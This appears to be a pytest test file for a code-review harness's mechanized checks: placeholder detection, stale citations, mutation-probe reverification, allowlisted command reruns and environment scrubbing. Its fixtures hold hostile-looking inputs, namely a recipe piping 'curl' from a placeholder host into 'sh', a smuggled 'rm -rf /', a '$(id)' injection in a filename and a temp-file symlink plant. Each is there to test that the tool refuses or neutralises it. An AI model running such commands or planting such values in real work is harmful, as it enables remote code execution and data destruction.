"""C-HE-31 mechanized pre-checks (U-HE-40).

Per class (spec C-HE-31 Verification): a fixture exhibiting the defect yields a finding, a
clean fixture yields none, and for the two hybrid classes an intentionally-false claim is
detected as false. `test_promotion_demotion_state_machine` is mechanism-correctness only --
not evidence the thresholds are calibrated.

Every fixture builds a miniature tree on disk and hands the check a `Subject`: the checks
never shell out, so what is under test is exactly how each one reads a tree.
"""

from __future__ import annotations

import json
import os
import subprocess
import sys
import threading
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent))

import finding_record as fr
import mechanized_checks as mc
import pin_scope
from mechanized_checks import (
    cited_symbol_exists,
    core,
    delta_chain_drift,
    runner,
    stale_carry,
    unrun_cli,
    unswept_consumers,
)
from mechanized_checks import double_fidelity as tdf
from mechanized_checks import mutation_probe_reverify as mpr

HEAD = "1234abcd" * 5
PROMOTED = "2026-09-14T00:00:00Z"


def _subject(
    repo: Path, *, changed=(), diff="", claims_text="", pr_body: str | None = ""
) -> core.Subject:
    universe = tuple(sorted(p.relative_to(repo).as_posix() for p in repo.rglob("*") if p.is_file()))
    return core.Subject(repo, tuple(changed), universe, diff, claims_text, pr_body)


def _row(
    arc: int,
    kind: str,
    *,
    n: int = 1,
    ts: str = "2026-09-15T00:00:00Z",
    disposition: str | None = None,
    producer: str = "stale_carry",
    lineage: str = "fresh",
) -> dict:
    location = f"doc.md:{arc}"
    core_ = fr.FindingCore(
        fr.make_finding_id(producer, HEAD, location, n),
        location,
        "e",
        "x",
        "warn",
        "mechanized-deterministic",
        lineage,
        producer,
    )
    env = fr.Envelope(
        kind,
        ts,
        f"arc-{arc}",
        "lane-a",
        HEAD,
        None,
        None,
        None,
        disposition=disposition,
        disposition_actor="operator" if disposition else None,
    )
    return fr.make_row(core_, env)


# --- registry + state ------------------------------------------------------------------


def test_every_class_declared_with_kind():
    assert {c.check_id: c.kind for c in mc.CHECKS} == {
        "stale_carry": "deterministic",
        "mutation_probe_reverify": "hybrid",
        "unswept_consumers": "deterministic",
        "unrun_cli": "deterministic",
        "cited_symbol_exists": "deterministic",
        "delta_chain_drift": "deterministic",
        "test_double_fidelity": "hybrid",
    }


def test_tracked_state_file_covers_every_registered_check():
    # parses and names exactly the registered checks; each entry's MODE is runtime state a
    # promotion rewrites, so it is never pinned here
    assert set(core.load_state()) == {c.check_id for c in mc.CHECKS}


def test_save_state_never_follows_a_planted_temp_symlink(tmp_path, monkeypatch):
    state_path = tmp_path / "state.json"
    monkeypatch.setattr(core, "STATE_PATH", state_path)
    victim = tmp_path / "victim.txt"
    victim.write_text("keep me\n")
    (tmp_path / "state.json.tmp").symlink_to(victim)  # the old predictable staging name
    core.save_state({"stale_carry": core.Advisory()})
    assert victim.read_text() == "keep me\n"
    assert state_path.is_file() and not state_path.is_symlink()
    assert json.loads(state_path.read_text()) == {
        "stale_carry": {"mode": "advisory", "windows": []}
    }


def test_a_malformed_state_file_is_refused_loudly(tmp_path, monkeypatch):
    monkeypatch.setattr(core, "STATE_PATH", tmp_path / "state.json")
    (tmp_path / "state.json").write_text(
        json.dumps({"stale_carry": {"mode": "blocking", "windows": []}})
    )
    with pytest.raises(core.StateError, match="promoted_at"):
        core.load_state()


# --- per-class fixtures ----------------------------------------------------------------


def test_stale_carry_flags_count_mismatch_and_placeholders(tmp_path):
    (tmp_path / "doc.md").write_text(
        "Three contracts:\n| id | name |\n|---|---|\n| a | x |\n| b | y |\n\nTBD: fill in <NNN>\n"
    )
    found = stale_carry.Check().run(_subject(tmp_path, changed=["doc.md"]))
    assert sorted(f.evidence for f in found) == [
        "claims 3 contracts but the table has 2 data rows",
        "placeholder token '<NNN>'",
        "placeholder token 'TBD'",
    ]


# mutation-probe: tools/mechanized_checks/stale_carry.py:52 drop the count-vs-table mismatch filter
def test_stale_carry_clean(tmp_path):
    (tmp_path / "ok.md").write_text(
        "Two contracts:\n| id | name |\n|---|---|\n| a | x |\n| b | y |\n\n"
        "Two rows:\n| a |\n| b |\n\nSee r<N>.log and TBDX.\n"
    )
    assert stale_carry.Check().run(_subject(tmp_path, changed=["ok.md"])) == []


# mutation-probe: tools/mechanized_checks/cited_symbol_exists.py:48-50 drop the cited-range filter
def test_cited_symbol_exists_fixture_and_clean(tmp_path):
    (tmp_path / "tools").mkdir()
    (tmp_path / "tools" / "x.py").write_text("def real():\n    pass\n")
    (tmp_path / "d.md").write_text("see `tools/x.py:9` and `phantom()` in `tools/x.py`\n")
    (tmp_path / "g.md").write_text("see `tools/x.py:1-2` and `real()` in `tools/x.py`\n")
    bad = cited_symbol_exists.Check().run(_subject(tmp_path, changed=["d.md"]))
    assert {f.location for f in bad} == {"tools/x.py:9", "phantom()"}
    assert cited_symbol_exists.Check().run(_subject(tmp_path, changed=["g.md"])) == []


# mutation-probe: tools/mechanized_checks/delta_chain_drift.py:26 drop the later-version filter
def test_delta_chain_drift(tmp_path):
    (tmp_path / "Doc_v1_8.md").write_text("## 7.4.2 Citation\nbody\n")
    (tmp_path / "Doc_v1_9.md").write_text("## 7.4.2 Citation (revised)\n")
    (tmp_path / "c.md").write_text("per `Doc_v1_8.md` §7.4.2\n")
    found = delta_chain_drift.Check().run(_subject(tmp_path, changed=["c.md"]))
    assert [f.location for f in found] == ["c.md:1"] and "Doc_v1_9.md" in found[0].evidence
    (tmp_path / "Doc_v1_9.md").write_text(
        "## 7.4.2.1 A subsection is not a re-table\n## 9.1 Other\n"
    )
    assert delta_chain_drift.Check().run(_subject(tmp_path, changed=["c.md"])) == []


def test_unswept_consumers_flags_references_to_a_vanished_symbol(tmp_path):
    (tmp_path / "a.py").write_text("def kept():\n    pass\n")
    (tmp_path / "b.py").write_text("from a import gone\ngone()\n")
    diff = "--- a/a.py\n+++ b/a.py\n-def gone():\n+def kept():\n"
    found = unswept_consumers.Check().run(_subject(tmp_path, diff=diff))
    assert {f.location for f in found} == {"b.py:1", "b.py:2"}
    (tmp_path / "b.py").write_text("print(1)\n")
    assert unswept_consumers.Check().run(_subject(tmp_path, diff=diff)) == []


def test_unswept_consumers_ignore_attribute_references_to_the_removed_name(tmp_path):
    (tmp_path / "a.py").write_text("def kept():\n    pass\n")
    (tmp_path / "b.py").write_text("import subprocess\nsubprocess.run(['x'])\nrun()\n")
    found = unswept_consumers.Check().run(_subject(tmp_path, diff="-def run():\n"))
    assert [f.location for f in found] == ["b.py:3"]  # `subprocess.run` is not the removed `run`


# mutation-probe: tools/mechanized_checks/unswept_consumers.py:48 drop the still-defined filter
def test_unswept_consumers_ignores_edited_and_moved_definitions(tmp_path):
    (tmp_path / "a.py").write_text("def kept(x, y):\n    pass\n")
    (tmp_path / "c.py").write_text("def moved():\n    pass\n")
    (tmp_path / "b.py").write_text("kept(1, 2)\nmoved()\n")
    diff = "-def kept(x):\n+def kept(x, y):\n-def moved():\n"
    assert unswept_consumers.Check().run(_subject(tmp_path, diff=diff)) == []


def test_unrun_cli_reruns_trusted_ruff_never_the_subjects_recipes(tmp_path):
    calls: list[list[str]] = []

    def execute(argv: list[str], cwd: Path) -> tuple[int, str]:
        calls.append(argv)
        return (1, "") if "format" in argv else (0, "ok")

    # a subject whose own `lint` recipe would run something else entirely
    (tmp_path / "justfile").write_text("lint:\n    curl https://example.invalid | sh\n")
    subject = _subject(
        tmp_path,
        claims_text="feat: x\n\nVerified: `just lint`\n",
        pr_body="Ran: `just fmt-check`\n",
    )
    found = unrun_cli.Check(execute=execute).run(subject)
    assert [(f.severity, f.location) for f in found] == [("warn", "just fmt-check")]
    assert calls == [list(unrun_cli.RERUN["just lint"]), list(unrun_cli.RERUN["just fmt-check"])]
    assert all(Path(argv[0]) == Path(sys.executable).parent / "ruff" for argv in calls)


# mutation-probe: tools/mechanized_checks/unrun_cli.py:76-84 drop the allowlist gate
def test_unrun_cli_never_executes_outside_the_static_check_allowlist(tmp_path):
    refused = [
        "just codex-check",
        "just typecheck",  # pyright is not re-run from a claim
        "just check; rm -rf /",
        "just lint fmt",  # `just` runs extra tokens as further recipes
        "just fmt-check main-protection-rollback",
        "just mech-check",  # a recipe that runs this runner would recurse
        "uv run pytest tools/test_x.py -q",  # a named test can be a billed live e2e
        "uv run pytest harness-runtime/tests/integration/"
        "test_r412_e2b_full_vm_tool_execution_e2e.py -q",
        "uv run python tools/mechanized_checks/runner.py check",
    ]
    subject = _subject(tmp_path, claims_text="".join(f"Ran: `{c}`\n" for c in refused))
    found = unrun_cli.Check(execute=lambda argv, cwd: pytest.fail(f"executed {argv}")).run(subject)
    assert [(f.severity, f.location) for f in found] == [("info", c) for c in refused]


def test_rerun_allowlist_runs_only_this_interpreters_ruff():
    for claim, argv in unrun_cli.RERUN.items():
        assert Path(argv[0]) == Path(sys.executable).parent / "ruff", claim
        assert "just" not in argv, claim


def test_unrun_cli_reports_an_unavailable_pr_body(tmp_path):
    found = unrun_cli.Check(execute=lambda argv, cwd: (0, "ok")).run(
        _subject(tmp_path, pr_body=None)
    )
    assert [(f.severity, f.location) for f in found] == [("info", "pr-body")]


def test_default_executor_runs_argv_without_a_shell(monkeypatch, tmp_path):
    seen: dict = {}

    def fake_run(argv, **kw):
        seen.update(argv=argv, **kw)
        return subprocess.CompletedProcess(argv, 0, "out", "err")

    monkeypatch.setattr(unrun_cli.subprocess, "run", fake_run)
    monkeypatch.setenv("ANTHROPIC_API_KEY", "secret")
    assert unrun_cli.execute_argv(["just", "check"], tmp_path) == (0, "outerr")
    assert "ANTHROPIC_API_KEY" not in seen["env"]
    assert seen["argv"] == ["just", "check"] and not seen.get("shell") and seen["cwd"] == tmp_path


def _probe_fixture(tmp_path: Path, *, logged: bool) -> core.Subject:
    tools = tmp_path / "tools"
    tools.mkdir()
    (tools / "x.py").write_text("A = 1\nB = 2\n")
    (tools / "test_x.py").write_text("# mutation-probe: drop B\ndef test_t():\n    assert True\n")
    (tmp_path / ".harness").mkdir()
    pinned = {
        "test": "uv run pytest tools/test_x.py::test_t -q",
        "file": "tools/x.py",
        "lines": "2-2",
        "rc": 0,
        # the recorded range stays valid while both files still digest to what the probe measured
        "target_sha": pin_scope.digest16((tools / "x.py").read_bytes()),
        "test_sha": pin_scope.digest16((tools / "test_x.py").read_bytes()),
    }
    (tmp_path / ".harness" / "mutation-probe-log.jsonl").write_text(
        (json.dumps(pinned) + "\n") * int(logged)
    )
    return _subject(tmp_path, changed=["tools/test_x.py"])


def test_mutation_probe_reverify_detects_a_false_annotation(tmp_path):
    probed = []

    def probe(repo: Path, file: str, lines: str, node: str) -> tuple[int, str]:
        probed.append((file, lines, node))
        return 1, ""  # PROBE FAILED: the test stayed green with the named lines removed

    found = mpr.Check(probe=probe).run(_probe_fixture(tmp_path, logged=True))
    assert probed == [("tools/x.py", "2-2", "tools/test_x.py::test_t")]
    assert [(f.severity, f.location) for f in found] == [("hard", "tools/test_x.py::test_t")]
    assert "annotation is FALSE" in found[0].evidence


@pytest.mark.parametrize(("rc", "expected"), [(0, []), (2, [("warn", "tools/test_x.py::test_t")])])
def test_mutation_probe_reverify_pinned_is_clean_and_indeterminate_is_named(tmp_path, rc, expected):
    found = mpr.Check(probe=lambda repo, file, lines, node: (rc, "noise\nREFUSED: why")).run(
        _probe_fixture(tmp_path, logged=True)
    )
    assert [(f.severity, f.location) for f in found] == expected
    assert all("REFUSED: why" in f.evidence for f in found)


# mutation-probe: tools/mechanized_checks/mutation_probe_reverify.py:209-213 drop the restore abort
@pytest.mark.parametrize("rc", [3, -9, 137])  # restore unverified, SIGKILL, a shell's 128+9
def test_mutation_probe_restore_failure_stops_the_run_whatever_the_mode(tmp_path, monkeypatch, rc):
    log = tmp_path / "gate.jsonl"
    monkeypatch.setattr(fr, "GATE_LOG_JSONL", log)
    restore_failed = mpr.Check(probe=lambda repo, file, lines, node: (rc, "RESTORE FAILED: x.py"))
    subject = _probe_fixture(tmp_path, logged=True)
    with pytest.raises(mpr.ProbeRestoreError, match=r"(?s)may still be mutated.*RESTORE FAILED"):
        runner.run_checks(
            subject,
            [restore_failed],
            {"mutation_probe_reverify": core.Advisory()},
            arc_id="u-he-40",
            lane_id="lane-a",
            head_sha=HEAD,
        )
    assert not log.exists()  # no finding row stands in for a possibly-mutated tree


# mutation-probe: tools/mechanized_checks/mutation_probe_reverify.py:169-177 drop the unprobed arm
def test_mutation_probe_reverify_never_reads_an_unprobed_annotation_as_verified(tmp_path):
    found = mpr.Check(probe=lambda *a: pytest.fail("probed without a logged range")).run(
        _probe_fixture(tmp_path, logged=False)
    )
    assert [(f.severity, f.location) for f in found] == [("warn", "tools/test_x.py::test_t")]
    assert "never probed" in found[0].evidence


# mutation-probe: tools/mechanized_checks/mutation_probe_reverify.py:178-186 drop the stale-pin arm
def test_mutation_probe_reverify_never_probes_a_range_whose_pin_went_stale(tmp_path):
    subject = _probe_fixture(tmp_path, logged=True)
    (tmp_path / "tools" / "x.py").write_text(
        "Z = 0\nA = 1\nB = 2\n"
    )  # a line lands above the block
    found = mpr.Check(probe=lambda *a: pytest.fail("probed a stale range")).run(subject)
    assert [(f.severity, f.location) for f in found] == [("warn", "tools/test_x.py::test_t")]
    assert "no longer pins" in found[0].evidence


def test_a_block_scoped_pin_whose_block_moved_is_stale_too(tmp_path):
    subject = _probe_fixture(tmp_path, logged=True)
    log = tmp_path / ".harness" / "mutation-probe-log.jsonl"
    row = json.loads(log.read_text())
    log.write_text(json.dumps({**row, "pin_scope": "block", "block_sha": "any"}) + "\n")
    (tmp_path / "tools" / "x.py").write_text("Z = 0\nA = 1\nB = 2\n")  # the block moved down
    found = mpr.Check(probe=lambda *a: pytest.fail("probed a moved block")).run(subject)
    assert [(f.severity, f.location) for f in found] == [("warn", "tools/test_x.py::test_t")]


def test_a_logged_range_goes_stale_when_the_test_file_changes(tmp_path):
    subject = _probe_fixture(tmp_path, logged=True)
    # the test changed (its annotation now names the logged lines) while the source did not
    (tmp_path / "tools" / "test_x.py").write_text(
        "# mutation-probe: tools/x.py:2 drop B\ndef test_t():\n    assert True\n"
    )
    found = mpr.Check(probe=lambda *a: pytest.fail("re-probed the old range")).run(subject)
    assert [(f.severity, f.location) for f in found] == [("warn", "tools/test_x.py::test_t")]
    assert "no longer pins" in found[0].evidence


# mutation-probe: tools/mechanized_checks/mutation_probe_reverify.py:160-168 drop the shell-safe arm
def test_a_node_that_needs_shell_quoting_is_named_not_reported_unprobed(tmp_path):
    tools = tmp_path / "tools"
    tools.mkdir()
    (tools / "x.py").write_text("A = 1\n")
    test_e = tools / "test_é.py"
    test_e.write_text("# mutation-probe: tools/x.py:1 drop A\ndef test_t():\n    assert True\n")
    (tmp_path / ".harness").mkdir()
    row = {  # the command run_probe itself logs: the node shell-quoted
        "test": "uv run pytest 'tools/test_é.py::test_t' -q",
        "file": "tools/x.py",
        "lines": "1",
        "rc": 0,
        "target_sha": pin_scope.digest16((tools / "x.py").read_bytes()),
        "test_sha": pin_scope.digest16(test_e.read_bytes()),
    }
    (tmp_path / ".harness" / "mutation-probe-log.jsonl").write_text(json.dumps(row) + "\n")
    subject = _subject(tmp_path, changed=["tools/test_é.py"])
    found = mpr.Check(probe=lambda *a: pytest.fail("probed a node it cannot match")).run(subject)
    assert [(f.severity, f.location) for f in found] == [("warn", "tools/test_é.py::test_t")]
    assert "needs shell quoting" in found[0].evidence


# mutation-probe: tools/mechanized_checks/mutation_probe_reverify.py:119 drop the named-lines match
def test_stacked_annotations_each_verify_their_own_named_lines(tmp_path):
    subject = _probe_fixture(tmp_path, logged=True)  # one live pinned row: tools/x.py lines 2-2
    test_x = tmp_path / "tools" / "test_x.py"
    test_x.write_text(
        "# mutation-probe: tools/x.py:1 drop A\n# mutation-probe: tools/x.py:2 drop B\n"
        "def test_t():\n    assert True\n"
    )
    log = tmp_path / ".harness" / "mutation-probe-log.jsonl"
    row = json.loads(log.read_text())
    log.write_text(json.dumps({**row, "test_sha": pin_scope.digest16(test_x.read_bytes())}) + "\n")
    probed = []

    def probe(repo: Path, file: str, lines: str, node: str) -> tuple[int, str]:
        probed.append(lines)
        return 0, ""

    found = mpr.Check(probe=probe).run(subject)
    assert probed == ["2-2"]  # line 2's own row, probed once -- never on line 1's behalf
    assert [(f.location, f.evidence) for f in found] == [
        (
            "tools/test_x.py::test_t",
            "annotation never probed: no pinned probe-log row for tools/x.py:1-1",
        )
    ]


def test_probe_command_quotes_the_filename_derived_node(monkeypatch, tmp_path):
    seen: dict = {}

    def fake_run(argv, **kw):
        seen.update(argv=argv, **kw)
        return subprocess.CompletedProcess(argv, 0, "", "")

    monkeypatch.setattr(mpr.subprocess, "run", fake_run)
    monkeypatch.setenv("OPENAI_API_KEY", "secret")
    mpr.run_probe(tmp_path, "tools/x.py", "2-2", "tools/test_$(id).py::test_t")
    assert "OPENAI_API_KEY" not in seen["env"]  # subject tests never inherit provider keys
    assert seen["argv"][-1] == "uv run pytest 'tools/test_$(id).py::test_t' -q"


# mutation-probe: tools/mechanized_checks/double_fidelity.py:24-27 drop the issubclass raise
def test_assert_fake_is_subclass_detects_a_false_fidelity_claim():
    class Real: ...

    class Good(Real): ...

    class Fake: ...

    tdf.assert_fake_is_subclass(Good, Real)
    with pytest.raises(AssertionError, match="wrong-fidelity"):
        tdf.assert_fake_is_subclass(Fake, Real)


# mutation-probe: tools/mechanized_checks/double_fidelity.py:72 drop the assertion exemption
def test_double_fidelity_flags_a_bare_double_without_an_executed_assertion(tmp_path):
    files = {
        "test_a.py": "class FakeClock:\n    pass\n\ndef test_a():\n    use(FakeClock())\n",
        "test_b.py": "class FakeClock:\n    pass\n\nassert_fake_is_subclass(FakeClock, Clock)\n\n"
        "def test_b():\n    use(FakeClock())\n",
        "test_c.py": "class FakeClock(Clock):\n    pass\n\ndef test_c():\n    use(FakeClock())\n",
        # a comment or a string that only MENTIONS the assertion exempts nothing
        "test_d.py": "class FakeClock:\n    pass\n\n# assert_fake_is_subclass(FakeClock, Clock)\n"
        "NOTE = 'assert_fake_is_subclass(FakeClock'\n\ndef test_d():\n    use(FakeClock())\n",
        # a call that may never run exempts nothing: under an `if`, or inside an uncalled helper
        "test_f.py": "class FakeClock:\n    pass\n\nif False:\n"
        "    assert_fake_is_subclass(FakeClock, Clock)\n\ndef test_f():\n    use(FakeClock())\n",
        "test_g.py": "class FakeClock:\n    pass\n\ndef _fidelity():\n"
        "    assert_fake_is_subclass(FakeClock, Clock)\n\ndef test_g():\n    use(FakeClock())\n",
        "test_e.py": "def test_e(:\n",
    }
    for name, text in files.items():
        (tmp_path / name).write_text(text)
    found = tdf.Check().run(_subject(tmp_path, changed=list(files)))
    assert [f.location for f in found] == [
        "test_a.py:1",
        "test_d.py:1",
        "test_f.py:1",
        "test_g.py:1",
        "test_e.py:1",
    ]
    assert "does not parse" in found[-1].evidence


# --- emission, run verdict, replay ------------------------------------------------------


def test_emit_writes_findings_and_a_clean_marker_and_reruns_never_collide(tmp_path, monkeypatch):
    log = tmp_path / "gate.jsonl"
    monkeypatch.setattr(fr, "GATE_LOG_JSONL", log)
    finding = [core.MechFinding("doc.md:1", "e", "x")]
    ids = {"arc_id": "u-he-40", "lane_id": "lane-a", "head_sha": HEAD, "lineage": "fresh"}
    written = core.emit("stale_carry", "deterministic", finding, **ids)
    written += core.emit("cited_symbol_exists", "deterministic", [], **ids)
    rows = fr.read_rows(log)
    assert [(r["record_kind"], r["producer"]) for r in rows] == [
        ("finding", "stale_carry"),
        ("no_finding", "cited_symbol_exists"),
    ]
    assert rows == written and rows[0]["finding_type"] == "mechanized-deterministic"
    core.emit(
        "stale_carry", "deterministic", finding, **ids
    )  # same head, same location: a NEW observation
    assert len(fr.read_rows(log)) == 3


class Canned:
    kind = "deterministic"
    replayable = True

    def __init__(self, check_id: str, findings: list[core.MechFinding]):
        self.check_id, self.findings = check_id, findings

    def run(self, subject: core.Subject) -> list[core.MechFinding]:
        return self.findings


def test_only_a_blocking_checks_warn_or_hard_finding_fails_the_run(tmp_path, monkeypatch):
    monkeypatch.setattr(fr, "GATE_LOG_JSONL", tmp_path / "gate.jsonl")
    subject = _subject(tmp_path)
    warn = [core.MechFinding("l", "e", "x")]
    info = [core.MechFinding("l", "e", "x", "info")]

    def run(findings, state):
        return runner.run_checks(
            subject,
            [Canned("stale_carry", findings)],
            {"stale_carry": state},
            arc_id="u-he-40",
            lane_id="lane-a",
            head_sha=HEAD,
        )

    assert run(warn, core.Advisory()) == 0
    assert run(warn, core.Blocking(PROMOTED)) == 1
    assert run(info, core.Blocking(PROMOTED)) == 0


# mutation-probe: tools/mechanized_checks/core.py:332-334 drop the gate_demotion row + NOTIFY
def test_promotion_demotion_state_machine(tmp_path, monkeypatch):
    monkeypatch.setattr(core, "STATE_PATH", tmp_path / "state.json")
    log = tmp_path / "gate.jsonl"
    monkeypatch.setattr(fr, "GATE_LOG_JSONL", log)
    ledger = Path(os.environ["HARNESS_LOOP_STATUS_PATH"])  # tools/conftest.py per-item venue
    core.save_state({"stale_carry": core.Advisory()})

    assert core.evaluate_promotion("stale_carry", [False] * 19 + [True]) is False
    assert (
        core.evaluate_promotion("stale_carry", [False] * 19) is False
    )  # a short replay never promotes
    assert isinstance(core.load_state()["stale_carry"], core.Advisory)
    assert core.evaluate_promotion("stale_carry", [False] * 20) is True
    assert isinstance(core.load_state()["stale_carry"], core.Blocking)
    promoted_at = core.load_state()["stale_carry"].promoted_at
    # windows computed for a different promotion never apply, whatever they read
    assert (
        core.evaluate_demotion("stale_carry", [3, 2], promoted_at="2000-01-01T00:00:00Z") is False
    )
    assert isinstance(core.load_state()["stale_carry"], core.Blocking) and not log.exists()

    assert (
        core.evaluate_demotion("stale_carry", [3], promoted_at=promoted_at) is False
    )  # one window: no demotion
    assert (
        core.evaluate_demotion("stale_carry", [3, 1], promoted_at=promoted_at) is False
    )  # second window < 2
    assert not log.exists()
    assert (
        core.evaluate_demotion("stale_carry", [3, 2], promoted_at=promoted_at) is True
    )  # two consecutive windows >= 2
    assert isinstance(core.load_state()["stale_carry"], core.Advisory)
    [row] = fr.read_rows(log)
    assert (row["record_kind"], row["producer"], row["severity"], row["location"]) == (
        "gate_demotion",
        "lanes_verify",
        "warn",
        "stale_carry",
    )
    assert "[3, 2]" in row["observed_evidence"]
    notify = [ln for ln in ledger.read_text().splitlines() if "| NOTIFY |" in ln]
    assert len(notify) == 1 and "stale_carry" in notify[0]
    assert (
        core.evaluate_demotion("stale_carry", [3, 2], promoted_at=promoted_at) is False
    )  # an advisory check is never re-demoted
    assert len(fr.read_rows(log)) == 1


def test_rejected_windows_end_at_the_latest_arc():
    # 41 live arcs; rejections on arcs 19, 20, 39 and 40. Windows counted from the first arc
    # would read [1, 2]; windows ending at the latest arc read [2, 2]
    rows = [_row(a, "no_finding") for a in range(41)]
    rows += [_row(a, "finding", n=2) for a in (19, 20, 39, 40)]
    rows += [_row(a, "finding_adjudication", n=2, disposition="rejected") for a in (19, 20, 39, 40)]
    assert core.rejected_windows(rows, "stale_carry", since=PROMOTED) == [2, 2]


# mutation-probe: tools/mechanized_checks/core.py:298 drop the since-promotion window filter
def test_rejected_windows_ignore_observations_from_before_promotion():
    rows = [_row(a, "no_finding") for a in range(40)]
    rows += [_row(a, "finding", n=2) for a in (19, 20, 39)]
    rows += [_row(a, "finding_adjudication", n=2, disposition="rejected") for a in (19, 20, 39)]
    # a back-filled observation stamped before promotion, appended last: counted, it would be
    # the latest arc and shift both windows ([1, 2] -> [2, 2])
    early = "2026-09-01T00:00:00Z"
    rows += [
        _row(99, "no_finding", ts=early),
        _row(99, "finding", n=2, ts=early),
        _row(99, "finding_adjudication", n=2, ts=early, disposition="rejected"),
    ]
    rows += [
        _row(7, "finding", n=2, producer="cited_symbol_exists"),
        _row(
            7, "finding_adjudication", n=2, disposition="rejected", producer="cited_symbol_exists"
        ),
    ]
    assert core.rejected_windows(rows, "stale_carry", since=PROMOTED) == [1, 2]


# mutation-probe: tools/mechanized_checks/core.py:297 drop the replay-lineage filter
def test_rejected_windows_never_count_replay_observations():
    rows = [_row(a, "no_finding") for a in range(40)]
    rows += [_row(500 + a, "no_finding", lineage="replay") for a in range(40)]
    rows += [_row(500 + a, "finding", n=2, lineage="replay") for a in range(40)]
    rows += [
        _row(500 + a, "finding_adjudication", n=2, disposition="rejected", lineage="replay")
        for a in range(40)
    ]
    # counted, the replay arcs would add two full windows of rejections: [0, 0, 20, 20]
    assert core.rejected_windows(rows, "stale_carry", since=PROMOTED) == [0, 0]


def test_rejected_windows_ignore_rejections_recorded_before_promotion():
    early = "2026-09-01T00:00:00Z"
    rows = [_row(a, "finding", n=2, ts=early) for a in (1, 2, 21, 22)]
    rows += [
        _row(a, "finding_adjudication", n=2, ts=early, disposition="rejected")
        for a in (1, 2, 21, 22)
    ]
    rows += [_row(a, "no_finding") for a in range(40)]  # the same arcs, rechecked clean since
    assert core.rejected_windows(rows, "stale_carry", since=PROMOTED) == [0, 0]


def test_subject_env_matches_the_parity_scrub(monkeypatch):
    script = (core.REPO / "tools" / "codex-parity-check.sh").read_text().splitlines()
    unset = {name for line in script if line.startswith("unset ") for name in line.split()[1:]}
    assert set(core.SUBJECT_ENV_DROP) == unset
    for name in unset:
        monkeypatch.setenv(name, "secret")
    env = core.subject_env()
    assert not unset & set(env) and env["PYTHON_KEYRING_BACKEND"] == "keyring.backends.null.Keyring"


def test_default_rerun_never_imports_a_subject_ruff_module(tmp_path):
    marker = tmp_path / "shadowed"
    (tmp_path / "ruff.py").write_text(f"open({str(marker)!r}, 'w').close()\n")
    rc, out = unrun_cli.execute_argv(list(unrun_cli.RERUN["just lint"]), tmp_path)
    assert not marker.exists() and out.strip(), (rc, out)


def test_replay_verdict_never_reads_unlooked_or_unadjudicated_as_clean():
    arcs = [f"arc-{a}" for a in range(20)]
    measured = [_row(a, "no_finding") for a in range(20)]
    assert core.replay_verdict(measured[:-1], "stale_carry", arcs) == core.Unmeasured(("arc-19",))
    pending = [*measured, _row(4, "finding", n=2)]
    assert core.replay_verdict(pending, "stale_carry", arcs) == core.Pending(1)
    decided = [*pending, _row(4, "finding_adjudication", n=2, disposition="rejected")]
    assert core.replay_verdict(decided, "stale_carry", arcs) == core.Measured(
        tuple(a == 4 for a in range(20))
    )


def test_replay_selects_squash_merged_arcs_and_skips_refreshes():
    log = [
        "a1\tops: roadmap status refresh post-#1525 (#1526)",
        "b2\tdocs(he-lanes): U-HE-39 skill carriers (#1525)",
        "c3\tWIP local commit",
        "d4\tfeat(he-lanes): U-HE-38 cohorts (#1523)",
    ]
    assert runner.select_replay_commits(log, 2) == ["b2", "d4"]
    with pytest.raises(runner.ReplayError, match="only 2"):
        runner.select_replay_commits(log, 3)


def _git(repo: Path, *args: str) -> str:
    return subprocess.run(
        ["git", "-C", str(repo), "-c", "user.name=t", "-c", "user.email=t@t", *args],
        check=True,
        capture_output=True,
        text=True,
    ).stdout.strip()


def test_subjects_gather_the_change_at_the_edge(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    _git(repo, "init", "-q")
    (repo / "a.md").write_text("one\n")
    _git(repo, "add", "a.md")
    _git(repo, "commit", "-qm", "base")
    base = _git(repo, "rev-parse", "HEAD")
    (repo / "a.md").write_text("two\n")
    _git(repo, "commit", "-qam", "Verified: `just check` (#7)")
    head = _git(repo, "rev-parse", "HEAD")
    (repo / "b.md").write_text("new\n")  # untracked, not ignored: part of a pre-commit change

    live = runner.working_tree_subject(repo, base=base, pr_body=lambda repo, ref: None)
    assert live.changed == ("a.md", "b.md") and set(live.universe) == {"a.md", "b.md"}
    assert (
        "Verified: `just check`" in live.claims_text
        and "-one" in live.diff
        and live.pr_body is None
    )

    assert (
        runner.arc_pr_body(repo, head, pr_body=lambda repo, ref: f"body of #{ref}") == "body of #7"
    )
    with runner.commit_subject(repo, head, body="body") as replayed:
        assert replayed.changed == ("a.md",) and replayed.universe == ("a.md",)
        assert (
            replayed.read("a.md") == "two\n"
            and replayed.read("b.md") is None
            and replayed.pr_body == "body"
        )
        # a real checkout at the arc's commit, so a mutation probe can verify its restore there
        assert _git(replayed.repo, "rev-parse", "HEAD") == head
        tree = replayed.repo
    assert not tree.exists() and str(tree) not in _git(repo, "worktree", "list")


def test_subjects_keep_non_ascii_paths_literal(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    _git(repo, "init", "-q")
    (repo / "a.md").write_text("one\n")
    _git(repo, "add", "a.md")
    _git(repo, "commit", "-qm", "base")
    base = _git(repo, "rev-parse", "HEAD")
    (repo / "notes_é.md").write_text("TBD\n")
    _git(repo, "add", "notes_é.md")
    _git(repo, "commit", "-qm", "notes (#8)")
    head = _git(repo, "rev-parse", "HEAD")
    live = runner.working_tree_subject(repo, base=base, pr_body=lambda r, ref: None)
    assert live.changed == ("notes_é.md",)
    assert live.changed_texts(".md") == [("notes_é.md", "TBD\n")]
    with runner.commit_subject(repo, head, body=None) as replayed:
        assert replayed.changed == ("notes_é.md",) and "notes_é.md" in replayed.universe


def test_state_transitions_serialize_on_the_state_lock(tmp_path, monkeypatch):
    monkeypatch.setattr(core, "STATE_PATH", tmp_path / "state.json")
    core.save_state({"stale_carry": core.Advisory()})
    done = threading.Event()

    def promote() -> None:
        core.evaluate_promotion("stale_carry", [False] * 20)
        done.set()

    worker = threading.Thread(target=promote)
    with core.state_lock():
        worker.start()
        assert not done.wait(0.3)  # the transition waits on the lock this test holds
    worker.join(10)
    assert done.is_set() and isinstance(core.load_state()["stale_carry"], core.Blocking)


class Counting(Canned):
    def __init__(self, check_id: str):
        super().__init__(check_id, [])
        self.seen: list[tuple[str, ...]] = []

    def run(self, subject: core.Subject) -> list[core.MechFinding]:
        self.seen.append(subject.changed)
        return []


def _replay_repo(tmp_path: Path, monkeypatch) -> Path:
    """Three squash-merged arcs (#1..#3); replay windows of two select #3 and #2."""
